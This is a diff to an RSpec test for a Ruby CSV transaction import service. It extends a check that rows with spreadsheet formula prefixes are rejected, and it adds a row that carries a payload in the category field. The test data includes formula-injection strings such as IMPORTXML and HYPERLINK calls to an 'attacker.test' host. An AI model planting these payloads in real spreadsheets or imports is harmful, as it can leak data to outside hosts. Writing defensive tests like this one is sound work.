@@ -142,17 +142,18 @@ RSpec.describe Transactions::ImportCsv, type: :service do
     end
 
     context "with spreadsheet formula injection content" do
-      it "rejects rows whose description starts with a formula prefix" do
+      it "rejects rows whose text fields start with a formula prefix" do
         bad_csv = csv_file(<<~CSV)
           date,description,amount,type,account_id,category
           #{Date.current},=IMPORTXML("https://attacker.test"),100.00,expense,#{account.id},
           #{Date.current},+1+2,100.00,expense,#{account.id},
           #{Date.current},-10+20,100.00,expense,#{account.id},
           #{Date.current},@HYPERLINK("https://attacker.test"),100.00,expense,#{account.id},
+          #{Date.current},Normal description,100.00,expense,#{account.id},=IMPORTXML("https://attacker.test")
         CSV
         result = service.call(file: bad_csv, user: user)
         expect(result[:imported]).to eq(0)
-        expect(result[:errors].length).to eq(4)
+        expect(result[:errors].length).to eq(5)
       end
     end
 
